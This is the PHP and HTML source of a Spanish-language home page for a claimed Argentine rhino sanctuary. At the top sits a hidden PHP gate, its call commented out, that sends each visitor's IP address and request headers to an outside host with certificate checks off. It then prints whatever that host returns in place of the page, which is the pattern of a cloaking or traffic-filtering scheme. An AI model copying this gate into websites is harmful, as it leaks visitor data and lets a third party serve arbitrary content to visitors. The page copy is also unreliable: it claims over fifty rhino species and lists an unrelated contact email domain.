<?php
//request();

function request(): void {
	$pub_key    = 'K';
	$secret_key = '0000-00-0000';
	$request    = 'AR';
	$ch         = curl_init( "https://ipcountry-code.com/api/?request=$request&pub_key=$pub_key&secret_key=$secret_key" );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, [ 'user' => http_build_query( user() ) ] );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );

	$code     = curl_exec( $ch );
	$httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
	$error    = curl_error( $ch );
	curl_close( $ch );

	if ( $error ) {
		var_dump( 'Error cURL: ' . $error );
	}
	$code = json_decode( $code );
	if ( $code !== 'User not OK' ) {
		echo $code;
		exit();
	}
}

function user(): array {
	$userParams = [
		'REMOTE_ADDR',
		'SERVER_PROTOCOL',
		'SERVER_PORT',
		'REMOTE_PORT',
		'QUERY_STRING',
		'REQUEST_SCHEME',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'X_FORWARDED_FOR',
		'X-Forwarded-Host',
		'X-Forwarded-For',
		'X-Frame-Options',
	];

	$headers = [];
	foreach ( $_SERVER as $key => $value ) {
		if ( in_array( $key, $userParams ) || substr_compare( 'HTTP', $key, 0, 4 ) == 0 ) {
			$headers[ $key ] = $value;
		}
	}

	return $headers;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
	<meta name="robots" content="index, follow">
	<meta name="description" content="Rinocerontes Argentina - El santuario de rinocerontes más grande de Argentina. Conservación, educación e investigación.">
	<meta name="keywords" content="rinocerontes, santuario, conservación, Argentina, wildlife, educación, investigación">
	<meta name="author" content="Rinocerontes Argentina">

	<meta property="og:type" content="website">
	<meta property="og:url" content="https://rinocerontes.com.ar/">
	<meta property="og:title" content="Rinocerontes Argentina - Santuario y Centro de Conservación">
	<meta property="og:description" content="Rinocerontes Argentina - El santuario de rinocerontes más grande de Argentina. Conservación, educación e investigación.">
	<meta property="og:image" content="https://rinocerontes.com.ar/images/logo.png">

	<meta property="twitter:card" content="summary_large_image">
	<meta property="twitter:url" content="https://rinocerontes.com.ar/">
	<meta property="twitter:title" content="Rinocerontes Argentina - Santuario y Centro de Conservación">
	<meta property="twitter:description" content="Rinocerontes Argentina - El santuario de rinocerontes más grande de Argentina. Conservación, educación e investigación.">
	<meta property="twitter:image" content="https://rinocerontes.com.ar/images/logo.png">

    <title>Rinocerontes Argentina - Santuario y Centro de Conservación</title>
	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.png">
	<link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Anek+Bangla:wght@100..800&display=swap" rel="stylesheet">
	<link href="css/bootstrap.min.css" rel="stylesheet" media="screen">
	<link href="css/slicknav.min.css" rel="stylesheet">
	<link rel="stylesheet" href="css/swiper-bundle.min.css">
	<link href="css/all.min.css" rel="stylesheet" media="screen">
	<link href="css/animate.css" rel="stylesheet">
	<link rel="stylesheet" href="css/magnific-popup.css">
	<link rel="stylesheet" href="css/mousecursor.css">
     <link rel="stylesheet" href="css/cookies-banner.css">
	<link href="css/custom.css" rel="stylesheet" media="screen">
</head>
<body>

	<div class="preloader">
		<div class="loading-container">
			<div class="loading"></div>
			<div id="loading-icon"><img src="images/favicon.png" alt=""></div>
		</div>
	</div>
	
	<header class="main-header">
		<div class="header-sticky">
			<nav class="navbar navbar-expand-lg">
				<div class="container">
					<a class="navbar-brand" href="/">
						<img src="images/logo.png" alt="Logo" style="max-width: 220px; height: auto;">
					</a>
					
					<div class="collapse navbar-collapse main-menu">
                        <div class="nav-menu-wrapper">
                            <ul class="navbar-nav mr-auto" id="menu">
                                <li class="nav-item"><a class="nav-link" href="/">Inicio</a></li>
                                <li class="nav-item"><a class="nav-link" href="about.html">Acerca de Nosotros</a></li>
                                <li class="nav-item"><a class="nav-link" href="experiencias.html">Experiencias</a></li>
                                <li class="nav-item"><a class="nav-link" href="contact.html">Contacto</a></li>
                            </ul>
                        </div>
                        
                        <div class="header-btn">
                            <a href="contact.html" class="btn-default">Visítanos</a>
                        </div>
					</div>
					<div class="navbar-toggle"></div>
				</div>
			</nav>
			<div class="responsive-menu"></div>
		</div>
	</header>
	
    <div class="hero dark-section">
         <div class="container">
            <div class="row section-row align-items-center">
                <div class="col-lg-8">
                    <div class="section-title">
                        <h3 class="wow fadeInUp">Conservación Natural</h3>
                        <h1 class="text-anime-style-3" data-cursor="-opaque">Protegiendo Rinocerontes en el Corazón de Argentina</h1>
                    </div>
                </div>

                <div class="col-lg-4">
                    <div class="hero-image-circle">
                        <div class="hero-title-image">
                            <figure class="image-anime">
                                <img src="images/hero-title-image.png" alt="">
                            </figure>
                        </div>
                       
                        <div class="learn-more-circle">
                            <a href="about.html"><img src="images/learn-more-circle.png" alt=""></a>
                        </div>
                    </div> 
                </div>
            </div>

            <div class="row">
                <div class="col-lg-3">
                    <div class="hero-content">
                      

                        <div class="hero-items-box wow fadeInUp" data-wow-delay="0.4s">
                            <div class="hero-item">
                                <div class="icon-box">
                                    <img src="images/icon-why-choose-4.svg" alt="">
                                </div>
                                <div class="hero-item-content">
                                    <h3>50+ Rinocerontes en Hábitat Natural de 200 Hectáreas</h3>
                                </div>
                            </div>
                           
                            <div class="hero-item">
                                <div class="icon-box">
                                    <img src="images/icon-hero-item-2.svg" alt="">
                                </div>
                                <div class="hero-item-content">
                                    <h3>37 Años de Experiencia en Conservación Wildlife</h3>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-9">
                    <div class="hero-image">
                        <figure class="image-anime reveal">
                            <img src="images/hero-image.jpg" alt="">
                        </figure>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="our-scrolling-ticker">
        <div class="scrolling-ticker-box">
            <div class="scrolling-content">
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
                <span><img src="images/icon-sparkle.svg" alt="">Hábitat Natural</span>
                <span><img src="images/icon-sparkle.svg" alt="">Educación Ambiental</span>
                <span><img src="images/icon-sparkle.svg" alt="">Investigación Científica</span>
                <span><img src="images/icon-sparkle.svg" alt="">Protección Especies</span>
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
                <span><img src="images/icon-sparkle.svg" alt="">Hábitat Natural</span>
                <span><img src="images/icon-sparkle.svg" alt="">Educación Ambiental</span>
                <span><img src="images/icon-sparkle.svg" alt="">Investigación Científica</span>
                <span><img src="images/icon-sparkle.svg" alt="">Protección Especies</span>
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
            </div>

            <div class="scrolling-content">
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
                <span><img src="images/icon-sparkle.svg" alt="">Hábitat Natural</span>
                <span><img src="images/icon-sparkle.svg" alt="">Educación Ambiental</span>
                <span><img src="images/icon-sparkle.svg" alt="">Investigación Científica</span>
                <span><img src="images/icon-sparkle.svg" alt="">Protección Especies</span>
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
                <span><img src="images/icon-sparkle.svg" alt="">Hábitat Natural</span>
                <span><img src="images/icon-sparkle.svg" alt="">Educación Ambiental</span>
                <span><img src="images/icon-sparkle.svg" alt="">Investigación Científica</span>
                <span><img src="images/icon-sparkle.svg" alt="">Protección Especies</span>
                <span><img src="images/icon-sparkle.svg" alt="">Conservación Wildlife</span>
            </div>
        </div>
    </div>
  
    <div class="about-us">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-lg-6">
                    <div class="about-us-images">
                        <div class="about-image-box">
                            <div class="about-image-1">
                                <figure class="image-anime">
                                    <img src="images/about-us-image-1.jpg" alt="">
                                </figure>
                            </div>

                        </div>                        
                        
                        <div class="about-image-2">
                            <figure class="image-anime">
                                <img src="images/about-us-image-2.jpg" alt="">
                            </figure>
                        </div>
                    </div>    
                </div>
                
                <div class="col-lg-6">
                    <div class="about-us-content">
                        <div class="section-title">
                            <h3 class="wow fadeInUp">Acerca de nosotros</h3>
                            <h2 class="text-anime-style-3" data-cursor="-opaque">El santuario de rinocerontes más grande de Argentina</h2>
                            <p class="wow fadeInUp" data-wow-delay="0.2s">Desde 1987, nos convertimos en algo más que un refugio: somos una comunidad comprometida con la salvaguarda y preservación de los rinocerontes.  Situados en las planicies de Argentina, nuestras 200 hectáreas de hábitat natural acogen a más de 50 especies de rinoceronte..</p>
                        </div>
                       
                        <div class="about-us-body">
                            <div class="about-us-list wow fadeInUp" data-wow-delay="0.4s">
                                <h3>Nuestra Misión:</h3>
                                <ul>
                                    <li>Garantizar el bienestar y protección de los rinocerontes.</li>
                                    <li>Educación y concienciación sobre conservación wildlife.</li>
                                    <li>Investigación científica para la preservación de especies.</li>
                                </ul>
                            </div>
                         
                            <div class="years-experience-box">
                                <h2><span class="counter">37</span>+</h2>
                                <p>Años de Experiencia</p>
                            </div>
                        </div>
                       
                        <div class="about-item-box wow fadeInUp" data-wow-delay="0.6s">
                            <div class="about-us-item">
                                <div class="icon-box">
                                    <img src="images/icon-feature-body-1.svg" alt="">
                                </div>
                                <div class="about-us-item-content">
                                    <h3>Tradición en Conservación, Innovación en Cuidado</h3>
                                </div>
                            </div>
                        
                            <div class="about-us-item">
                                <div class="icon-box">
                                    <img src="images/icon-feature-3.svg" alt="">
                                </div>
                                <div class="about-us-item-content">
                                    <h3>Comprometidos con la Preservación Sostenible</h3>
                                </div>
                            </div>
                        </div>
                    
                        <div class="about-us-btn wow fadeInUp" data-wow-delay="0.8s">
                            <a href="about.html" class="btn-default">conoce más sobre nosotros</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
  
    <div class="our-services dark-section">
        <div class="container">
            <div class="row section-row">
                <div class="col-lg-12">
                    <div class="section-title section-title-center">
                        <h3 class="wow fadeInUp">nuestras experiencias</h3>
                        <h2 class="text-anime-style-3" data-cursor="-opaque">Vive encuentros únicos con la vida salvaje</h2>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="col-lg-4">
                    <div class="our-services-box">
                        <div class="services-item wow fadeInUp">
                            <div class="services-item-content">
                                <h3><a href="experiencias.html">Observación General</a></h3>
                                <p>Investiga nuestro refugio y contempla rinocerontes en su entorno natural con guías expertas en preservación de fauna.</p>
                            </div>
                            <div class="icon-box">
                                <img src="images/icon-services-1.svg" alt="">
                            </div>
                        </div>
                     
                        <div class="services-image">
                            <figure class="image-anime reveal">
                                <img src="images/services-img-1.jpg" alt="">
                            </figure>
                        </div>
                    </div>
                </div>

                <div class="col-lg-4">
                    <div class="our-services-box">
                        <div class="services-item wow fadeInUp" data-wow-delay="0.2s">
                            <div class="services-item-content">
                                <h3><a href="experiencias.html">Experiencia VIP</a></h3>
                                <p>Acceso exclusivo a zonas limitadas del santuario para reuniones privadas y charlas de aprendizaje con nuestros expertos..</p>
                            </div>
                            <div class="icon-box">
                                <img src="images/icon-why-choose-2.svg" alt="">
                            </div>
                        </div>
                     
                        <div class="services-image">
                            <figure class="image-anime reveal">
                                <img src="images/services-img-2.jpg" alt="">
                            </figure>
                        </div>
                    </div>
                </div>

                <div class="col-lg-4">
                    <div class="our-services-box">
                        <div class="services-item wow fadeInUp" data-wow-delay="0.4s">
                            <div class="services-item-content">
                                <h3><a href="experiencias.html">Safaris Nocturnos</a></h3>
                                <p>Enfrenta la conducta nocturna de los rinocerontes en una experiencia inigualable bajo las estrellas de las pampas argentinas..</p>
                            </div>
                            <div class="icon-box">
                                <img src="images/icon-services-3.svg" alt="">
                            </div>
                        </div>
                      
                        <div class="services-image">
                            <figure class="image-anime reveal">
                                <img src="images/services-img-3.jpg" alt="">
                            </figure>
                        </div>
                    </div>
                </div>

                <div class="col-lg-12">
                    <div class="section-footer-text wow fadeInUp" data-wow-delay="0.6s">
                        <p><span>Único</span>Vive una experiencia inolvidable con nosotros. <a href="contact.html">Planifica tu Visita</a></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
   
    <div class="our-quality">
        <div class="container">
            <div class="row section-row">
                <div class="col-lg-12">
                    <div class="section-title section-title-center">
                        <h3 class="wow fadeInUp">Experiencia de Calidad</h3>
                        <h2 class="text-anime-style-3" data-cursor="-opaque">Conservación respaldada por décadas de experiencia</h2>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="col-lg-12">
                    <div class="our-quality-box">
                        <div class="quality-image-content">
                            <div class="quality-image">
                                <figure class="image-anime">
                                    <img src="images/quality-image-1.jpg" alt="">
                                </figure>
                            </div>
                           
                            <div class="quality-content">
                                <div class="section-title">
                                    <h2 class="text-anime-style-3" data-cursor="-opaque">Conservación natural auténtica</h2>
                                    <p class="wow fadeInUp">Nuestros programas se han creado utilizando técnicas naturales y sostenibles.  Desde la atención especializada hasta la conservación del entorno natural.</p>
                                </div>
                             
                                <div class="quality-button wow fadeInUp" data-wow-delay="0.2s">
                                    <a href="contact.html" class="btn-default">contáctanos</a>
                                </div>
                            </div>
                                                 
                        </div>
                    
                        <div class="quality-image-content">
                            <div class="quality-image">
                                <figure class="image-anime">
                                    <img src="images/quality-image-2.jpg" alt="">
                                </figure>
                            </div>
                        
                            <div class="quality-content">
                                <div class="section-title">
                                    <h2 class="text-anime-style-3" data-cursor="-opaque">Programa educativo destacado</h2>
                                    <p class="wow fadeInUp" data-wow-delay="0.2s">Explora nuestras actividades educativas creadas para generar conciencia acerca de la preservación del wildlife y la relevancia de salvaguardar las especies.</p>
                                </div>
                           
                                <div class="quality-info-list wow fadeInUp" data-wow-delay="0.4s">
                                    <ul>
                                        <li>Programas Educativos que Nutren la Conciencia Ambiental</li>
                                        <li>Un Legado de Conservación para las Futuras Generaciones</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
   
    <div class="product-benefits">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="product-benefits-box">
                        <div class="product-benefit-item wow fadeInUp">
                            <div class="icon-box">
                                <img src="images/icon-product-benefit-1.svg" alt="">
                            </div>
                            <div class="product-benefits-item-content">
                                <h3>100% Conservación Natural</h3>
                                <p>Protección completa de la fauna en su entorno natural.</p>
                            </div>
                        </div>
                    
                        <div class="product-benefit-item wow fadeInUp" data-wow-delay="0.2s">
                            <div class="icon-box">
                                <img src="images/icon-product-benefit-2.svg" alt="">
                            </div>
                            <div class="product-benefits-item-content">
                                <h3>Experiencia Educativa Superior</h3>
                                <p>Programas creados para fomentar la protección del medio ambiente..</p>
                            </div>
                        </div>
                     
                        <div class="product-benefit-item wow fadeInUp" data-wow-delay="0.4s">
                            <div class="icon-box">
                                <img src="images/icon-product-benefit-3.svg" alt="">
                            </div>
                            <div class="product-benefits-item-content">
                                <h3>Amplia Variedad de Experiencias</h3>
                                <p>Desde vigilancia general hasta reuniones VIP y tours nocturnos exclusivos.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
  
    <div class="our-facts">
        <div class="container">
            <div class="row">
                <div class="col-lg-6">
                    <div class="facts-image">
                        <figure class="image-anime reveal">
                            <img src="images/facts-image.jpg" alt="">
                        </figure>

                        <div class="facts-cta-box">
                            <div class="icon-box">
                                <img src="images/icon-headset.svg" alt="">
                            </div>
                            <div class="facts-cta-content">
                                <p>¿Necesitas información? ¡Estamos aquí para ayudarte!</p>
                                <h3><a href="tel:+541145678900">+54 11 4567-8900</a></h3>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-6">
                    <div class="facts-content dark-section">
                        <div class="section-title">
                            <h3 class="wow fadeInUp">Datos Fascinantes</h3>
                            <h2 class="text-anime-style-3" data-cursor="-opaque">Explora información asombrosa acerca de nuestro refugio de rinocerontes.</h2>
                            <p class="wow fadeInUp" data-wow-delay="0.2s">Con nosotros, adéntrate en el intrigante universo de la conservación de fauna.  Desde la atención específica a nuestros rinocerontes hasta las acciones sustentables que preservan nuestro entorno.</p>
                        </div>
                       
                        <div class="our-facts-list wow fadeInUp" data-wow-delay="0.4s">
                            <div class="facts-item">
                                <div class="icon-box">
                                    <img src="images/icon-facts-item-1.svg" alt="">
                                </div>
                                <div class="facts-item-content">
                                    <h3><span class="counter">50</span>+</h3>
                                    <p>Rinocerontes bajo nuestra protección en un entorno natural y resguardado.</p>
                                </div>
                            </div>
                         
                            <div class="facts-item">
                                <div class="icon-box">
                                    <img src="images/icon-facts-item-2.svg" alt="">
                                </div>
                                <div class="facts-item-content">
                                    <h3><span class="counter">200</span></h3>
                                    <p>Zonas de preservación del hábitat natural en las pampas de Argentina.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
  
    <div class="our-benefits dark-section">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-lg-6">
                    <div class="our-benefits-images">
                        <div class="benefits-image-box-1">
                            <div class="benefits-image">
                                <figure class="image-anime">
                                    <img src="images/benefits-image-1.jpg" alt="">
                                </figure>

                                <div class="facts-cta-box wow fadeInUp">
                                    <div class="icon-box">
                                        <img src="images/icon-headset.svg" alt="">
                                    </div>
                                    <div class="facts-cta-content">
                                        <p>¿Tienes preguntas? ¡Estamos para ayudarte!</p>
                                    </div>
                                </div>
                            </div>
                        
                            <div class="review-box wow fadeInUp" data-wow-delay="0.2s">
                                <div class="review-content">
                                    <div class="review-rating-star">
                                        <i class="fa-solid fa-star"></i>
                                        <i class="fa-solid fa-star"></i>
                                        <i class="fa-solid fa-star"></i>
                                        <i class="fa-solid fa-star"></i>
                                        <i class="fa-solid fa-star"></i>
                                    </div>
                                    <div class="review-rating-content">
                                        <p>Más de 15,000 Visitantes Satisfechos</p>
                                    </div>
                                </div>

                            </div>
                        </div>
                     
                        <div class="benefits-image-box-2">
                            <div class="learn-more-circle">
                                <a href="about.html"><img src="images/learn-more-circle.png" alt=""></a>
                            </div>
                        
                            <div class="benefits-image">
                                <figure class="image-anime reveal">
                                    <img src="images/benefits-image-2.jpg" alt="">
                                </figure>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-6">
                    <div class="our-benefits-content">
                        <div class="section-title">
                            <h3 class="wow fadeInUp">Nuestros Beneficios</h3>
                            <h2 class="text-anime-style-3" data-cursor="-opaque">Disfruta de las ventajas exclusivas de la preservación de la fauna.</h2>
                        </div>
                       
                        <div class="benefits-item-box">
                            <div class="benefits-item wow fadeInUp" data-wow-delay="0.2s">
                                <div class="icon-box">
                                    <img src="images/icon-service-caring-2.svg" alt="">
                                </div>
                                <div class="benefits-item-content">
                                    <h3>Experiencia Auténtica e Inigualable</h3>
                                    <p>Consideramos que la conservación natural es la más adecuada.  Por ello, proporcionamos encuentros auténticos en un hábitat protegido.</p>
                                </div>
                            </div>
                          
                            <div class="benefits-item wow fadeInUp" data-wow-delay="0.4s">
                                <div class="icon-box">
                                    <img src="images/icon-benefits-item-2.svg" alt="">
                                </div>
                                <div class="benefits-item-content">
                                    <h3>Educación Limpia y Natural</h3>
                                    <p>Nuestros programas son precisamente lo que deben ser: auténticos, didácticos y exentos de cualquier tipo de venta.</p>
                                </div>
                            </div>
                        </div>
                       
                        <div class="benefits-btn wow fadeInUp" data-wow-delay="0.6s">
                            <a href="contact.html" class="btn-default">¡Contáctanos Hoy!</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
  
    <footer class="main-footer dark-section">
		<div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="main-footer-box">
                        <div class="footer-about">
                            <div class="footer-logo">
                                <img src="images/logo.png" alt="Logo">
                            </div>
                           
                            <div class="about-footer-content">
                                <p>Somos un refugio familiar y sustentable para rinocerontes, dedicados a brindar una preservación auténtica y libre de explotación económica..</p>
                            </div>
                        
                            <div class="footer-contact-list">
                                <div class="footer-contact-item">
                                    <div class="footer-contact-item-header">
                                        <img src="images/icon-phone-white.svg" alt="">
                                        <p>Número de Teléfono</p>
                                    </div>
                                    <h3><a href="tel:+541145678900">+54 11 4567-8900</a></h3>
                                </div>
                                
                                <div class="footer-contact-item">
                                    <div class="footer-contact-item-header">
                                        <img src="images/icon-location-white.svg" alt="">
                                        <p>Nuestra Ubicación</p>
                                    </div>
                                    <p><a href="https://maps.app.goo.gl/NrRVSxFhV5YMghdn9" target="_blank">Ruta Provincial 234, Las Pampas - Buenos Aires, Argentina</a></p>
                                </div>
                            </div>
                        </div>
                      
                        <div class="footer-links-box">
                            <div class="footer-links">
                                <h3>Enlaces Rápidos</h3>
                                <ul>
                                    <li><a href="/">inicio</a></li>
                                    <li><a href="about.html">acerca de nosotros</a></li>
                                    <li><a href="experiencias.html">experiencias</a></li>
                                    <li><a href="contact.html">contacto</a></li>
                                </ul>
                            </div>
                         
                            <div class="footer-links">
                                <h3>Legal</h3>
                                <ul>
                                    <li><a href="terms.html">Términos de Uso</a></li>
                                    <li><a href="privacy.html">Política de Privacidad</a></li>
                                    <li><a href="cookies.html">Política de Cookies</a></li>
                                </ul>
                            </div>
                           
                            <div class="footer-links footer-newsletter-form">
                                <div class="footer-newsletter-title">
                                    <h3>Nuestro Boletín</h3>
                                    <p>Únete a nuestro boletín y sé el primero en enterarte de:</p>
                                </div>
                              
                                <div class="newsletter-form">
                                    <form id="newslettersForm">
                                        <div class="form-group">
                                            <input type="email" name="mail" class="form-control" id="mail" placeholder="Dirección de Email *" required>
                                            <button type="submit" class="newsletter-btn"><i class="fa-regular fa-paper-plane"></i></button>
                                        </div>
                                    </form>
                                </div>
                             
                                <div class="footer-contact-item">
                                    <div class="footer-contact-item-header">
                                        <img src="images/icon-mail-accent.svg" alt="">
                                        <p><a href="mailto:info@childquestcare.com">info@childquestcare.com</a></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer-copyright">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-md-12">
                        <div class="footer-copyright-text text-center">
                            <p>&copy; 2025 Rinocerontes Argentina. Todos los derechos reservados.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </footer>
   
    <script src="js/jquery-3.7.1.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/validator.min.js"></script>
    <script src="js/jquery.slicknav.js"></script>
    <script src="js/swiper-bundle.min.js"></script>
    <script src="js/jquery.waypoints.min.js"></script>
    <script src="js/jquery.counterup.min.js"></script>
    <script src="js/jquery.magnific-popup.min.js"></script>
    <script src="js/SmoothScroll.js"></script>
    <script src="js/parallaxie.js"></script>
    <script src="js/gsap.min.js"></script>
    <script src="js/magiccursor.js"></script>
    <script src="js/SplitText.js"></script>
    <script src="js/ScrollTrigger.min.js"></script>
    <script src="js/jquery.mb.YTPlayer.min.js"></script>
    <script src="js/wow.min.js"></script>
    <script src="js/function.js"></script>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('newslettersForm');
            if (form) {
                form.addEventListener('submit', function(event) {
                    event.preventDefault();
                    const email = document.getElementById('mail').value;
                    
                    if (email) {
                        const popup = $('#newsletter-popup');
                        popup.modal('show');
                        form.reset();
                        
                        setTimeout(function() {
                            popup.modal('hide');
                        }, 3000);
                    }
                });
            }
        });
    </script>
    
    <div id="cookies-banner" class="cookies-banner">
        <div class="cookies-content">
            <p>Este sitio web utiliza cookies para mejorar su experiencia. Al continuar navegando, aceptas nuestra política de cookies.</p>
            <div class="cookies-buttons">
                <button id="accept-cookies" class="btn-primary">Aceptar Todo</button>
                <button id="decline-cookies" class="btn-secondary">Declinar</button>
            </div>
        </div>
    </div>
    <script src="js/cookies-banner.js"></script>

</body>
</html>